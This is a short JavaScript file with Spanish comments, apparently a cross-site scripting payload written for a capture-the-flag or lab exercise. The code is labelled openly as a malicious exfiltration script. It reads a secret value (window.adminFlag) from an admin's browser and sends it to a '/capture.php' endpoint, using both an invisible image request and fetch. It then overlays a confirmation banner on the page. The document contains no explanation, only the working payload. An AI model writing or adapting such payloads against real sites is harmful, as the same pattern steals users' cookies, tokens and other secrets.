// Script malicioso para exfiltrar la flag
(function() {
    // Intentar obtener la flag de window
    if (typeof window.adminFlag !== 'undefined') {
        const flag = window.adminFlag;
        
        // Exfiltrar al servidor local
        const exfilUrl = '/capture.php?flag=' + encodeURIComponent(flag);
        
        // Método 1: Imagen invisible
        const img = new Image();
        img.src = exfilUrl;
        
        // Método 2: Fetch (más moderno)
        fetch(exfilUrl)
            .then(response => response.json())
            .then(data => {
                console.log('✓ Flag exfiltrada:', data);
                // Mostrar confirmación visual
                document.body.insertAdjacentHTML('beforeend', 
                    '<div style="position:fixed;bottom:20px;right:20px;background:#4caf50;color:#fff;padding:20px;border-radius:10px;z-index:99999;font-weight:bold;">FLAG EXFILTRADA: ' + flag + '</div>'
                );
            });
    } else {
        console.log('⚠ adminFlag not found - are you admin?');
    }
})();
